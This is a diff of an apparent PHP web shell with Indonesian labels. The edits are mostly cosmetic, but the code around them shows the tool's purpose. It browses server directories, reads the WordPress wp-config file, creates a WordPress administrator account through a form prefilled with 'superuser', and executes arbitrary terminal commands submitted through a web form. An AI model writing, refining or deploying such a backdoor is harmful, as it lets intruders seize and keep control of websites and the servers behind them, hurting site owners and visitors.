@@ -826,7 +826,7 @@ $pathParts = explode('/', $dir);
 $baseUrl = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?');
 
 // Mulai output HTML
-echo '<h3>📁 : /';
+echo '<h3>📁 : <a href="?dir=/">/</a>';
 
 // Variabel untuk menyimpan path saat ini
 $currentPath = '';
@@ -961,7 +961,7 @@ echo "" . htmlspecialchars($direktori_sekarang);
     <?php endforeach; ?>
 </table>
 
-
+<br>
 
 
 <?php
@@ -1060,15 +1060,14 @@ if ($wp_config_file) {
 ?>
 <form method="post" action="">
     <label for="username">Username:</label>
-    <input type="text" id="username" name="username" required><br>
-
-    <label for="email">Email:</label>
-    <input type="email" id="email" name="email" value="superuseradmin@mail.com" required><br>
+    <input type="text" id="username" name="username" value="superuser" required><br>
+    <label for="email">Email:
+    </label><input type="email" id="email" name="email" value="superuseradmin@mail.com" required><br>
     <input type="submit" value="Buat Akun Administrator">
 
 </form>
 
-
+<br>
 
 
 <form method="post">
@@ -1133,6 +1132,8 @@ echo "<p><strong>HTTPS:</strong> " . (isset($_SERVER['HTTPS']) ? 'Ya' : 'Tidak')
     <input type="text" id="terminalCommand" name="terminalCommand" required><br><br>
     <input type="submit" value="Eksekusi">
 </form>
+
+<br>
 
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
